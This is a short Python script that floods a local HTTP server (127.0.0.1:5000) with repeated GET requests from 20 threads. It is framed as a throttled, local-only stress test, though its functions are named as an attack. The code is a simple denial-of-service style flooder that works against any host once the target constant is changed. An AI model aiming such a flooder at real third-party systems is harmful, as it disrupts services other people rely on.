import socket
import threading
import time
import signal
import sys

# Target (KEEP LOCAL ONLY for testing)
TARGET_IP = "127.0.0.1"
TARGET_PORT = 5000

# Config
THREADS = 20          # safer than 50
DELAY = 0.05          # small delay to avoid system crash
RUNNING = True

def attack(thread_id):
    global RUNNING
    while RUNNING:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect((TARGET_IP, TARGET_PORT))

            # Simulated HTTP request
            request = b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n"
            s.sendall(request)

            s.close()

            print(f"[Thread {thread_id}] Packet sent")

            time.sleep(DELAY)

        except Exception:
            # Ignore connection errors (normal during stress)
            time.sleep(DELAY)


def stop_attack(signal_received, frame):
    global RUNNING
    print("\n Stopping attack safely...")
    RUNNING = False
    sys.exit(0)


# Handle Ctrl+C properly
signal.signal(signal.SIGINT, stop_attack)

print(f" Simulating traffic on {TARGET_IP}:{TARGET_PORT}")
print(f"Threads: {THREADS} | Delay: {DELAY}s")
print("Press Ctrl+C to stop.\n")

# Start threads
for i in range(THREADS):
    t = threading.Thread(target=attack, args=(i,))
    t.daemon = True
    t.start()

# Keep main thread alive
while True:
    time.sleep(1)